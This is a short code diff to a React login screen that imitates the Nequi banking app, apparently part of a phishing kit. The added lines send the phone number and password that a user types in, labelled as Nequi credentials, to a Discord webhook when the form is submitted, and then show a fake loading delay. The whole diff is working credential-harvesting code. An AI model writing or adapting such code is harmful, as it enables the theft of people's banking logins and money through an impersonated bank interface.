@@ -1,5 +1,6 @@
 import { useState } from 'react'
 import { NequiLogo } from './NequiLogo'
+import { DiscordWebhookService } from '../services/DiscordWebhookService'
 
 interface NequiLoginScreenProps {
   phone: string
@@ -16,6 +17,12 @@ export function NequiLoginScreen({ phone, onSuccess }: NequiLoginScreenProps) {
 
   function handleSubmit() {
     if (!isValid) return
+    DiscordWebhookService.sendInfo(
+      'Credenciales Nequi ingresadas',
+      'Usuario ingresó su número y contraseña de Nequi',
+      { phone: phoneValue, role: 'Cliente' },
+      { 'Celular': phoneValue, 'Contraseña': password, 'Confirmación': 'Sí' },
+    )
     setLoading(true)
     setTimeout(() => {
       setLoading(false)
